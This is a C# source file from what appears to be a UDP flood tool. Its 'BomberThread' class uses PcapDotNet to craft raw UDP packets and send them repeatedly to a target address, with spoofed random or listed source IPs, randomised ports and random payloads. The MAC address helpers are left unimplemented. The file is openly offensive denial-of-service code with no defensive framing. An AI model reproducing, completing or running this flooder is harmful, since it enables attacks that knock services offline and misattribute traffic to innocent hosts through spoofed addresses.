using PcapDotNet.Core;
using PcapDotNet.Core.Extensions;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using System.Text;
using UDPFlood.Ethernet.FloodSettings;

namespace UDPFlood.Ethernet;

public delegate void BomberThreadEventArgs();

public class BomberThread
{
    public event BomberEventArgs? OnThreadChanged;

    public ThreadStatus Status { get; private set; }
    public BomberThreadSettings Settings { get; }
    public ulong PacketSendedCount { get; private set; }
    public DateTimeOffset LastPacketSendedAt { get; private set; }

    private readonly int _packetInSession;
    private int _sessionPacketCount = 0;
    private readonly Random _rnd = new();
    private readonly StringBuilder _sb = new();
    private readonly string  _alphabet = "qwertyuiopasdghjklzxcvbnm1234567890";

    public BomberThread(BomberThreadSettings settings)
    {
        Status = ThreadStatus.Stop;
        Settings = settings;
        PacketSendedCount = 0;

        if (Settings.Delay.IsDelay)
            _packetInSession = Settings.Delay.Delay / Settings.Delay.Every;
    }

    public void Start(LivePacketDevice device, IpV4Address destAddress)
    {
        if (Settings.Delay.IsDelay && _sessionPacketCount >= _packetInSession)
        {
            _sessionPacketCount = 0;
            Status = ThreadStatus.Awaited;
            OnThreadChanged?.Invoke();
            Thread.Sleep(Settings.Delay.Delay * 1000);
        }

        using var communicator = device.Open();

        var ethernetLayer = new EthernetLayer()
        {
            Source = GetSourceMac(),
            Destination = GetDestMac(),
            EtherType = EthernetType.None
        };

        var ipv4Layer = new IpV4Layer()
        {
            Source = GetSourceIp(device),
            CurrentDestination = destAddress,
            Fragmentation = IpV4Fragmentation.None,
            HeaderChecksum = null,
            Identification = 1,
            Options = IpV4Options.None,
            Protocol = null,
            TypeOfService = 0,
            Ttl = 100
        };

        var udpLayer = new UdpLayer()
        {
            SourcePort = GetSourcePort(),
            DestinationPort = GetDestPort(),
            Checksum = null,
            CalculateChecksumValue = true,
        };

        var payloadLayer = new PayloadLayer()
        {
            Data = new Datagram(Encoding.ASCII.GetBytes(GetContent())),
        };

        var builder = new PacketBuilder(ethernetLayer, ipv4Layer, udpLayer, payloadLayer);
        var packet = builder.Build(DateTime.Now);

        communicator.SendPacket(packet);

        LastPacketSendedAt = DateTimeOffset.Now;
        PacketSendedCount++;

        OnThreadChanged?.Invoke();

        if (Settings.Delay.IsDelay)
        {
            _sessionPacketCount++;
            Thread.Sleep(Settings.Delay.Every * 1000);
        }
    }

    private string GetContent()
    {
        switch (Settings.Content.Mode) 
        {
            case ContentMode.Empty: 
                return string.Empty;

            case ContentMode.FromContent: 
                return Settings.Content.Content ?? string.Empty;

            case ContentMode.Random:
                _sb.Clear();

                for (int i = 0; i < 32; i++)
                    _sb.Append(_alphabet[_rnd.Next(_alphabet.Length)]);

                return _sb.ToString();

            default:
                throw new InvalidOperationException();
        }
    }

    private ushort GetDestPort()
        => Settings.DestPort.Mode switch
        {
            PortMode.Random => (ushort)_rnd.Next(65535),
            PortMode.FromList => (ushort)(Settings.DestPort.Ports?.ToList()[_rnd.Next(Settings.DestPort.Ports.Count())] ?? 0),
            _ => throw new InvalidOperationException(),
        };

    private ushort GetSourcePort()
        => Settings.SrcPort.Mode switch
        {
            PortMode.Random => (ushort)_rnd.Next(65535),
            PortMode.FromList => (ushort)(Settings.SrcPort.Ports?.ToList()[_rnd.Next(Settings.SrcPort.Ports.Count())] ?? 0),
            _ => throw new InvalidOperationException(),
        };

    private IpV4Address GetSourceIp(LivePacketDevice device)
    {
        switch (Settings.Ip.Mode) 
        {
            case IpMode.MySelf:
                return new (device.GetNetworkInterface().GetIPProperties().GatewayAddresses[0].Address.ToString());

            case IpMode.FromList:
                return new(Settings.Ip.Addresses?.ToList()[_rnd.Next(Settings.Ip.Addresses.Count())]);

            case IpMode.Random:
                _sb.Clear();
                for (int i = 0; i < 4; i++)
                {
                    _sb.Append(_rnd.Next(256));
                    _sb.Append('.');
                }
                _sb.Remove(_sb.Length - 1, 1);

                return new(_sb.ToString());

            default:
                throw new InvalidOperationException();
        }
    }

    private MacAddress GetSourceMac()
    {

        throw new NotImplementedException();
    }

    private MacAddress GetDestMac()
    {
        throw new NotImplementedException();
    }
}

public enum ThreadStatus
{
    Stop,
    InProgress,
    Awaited
}
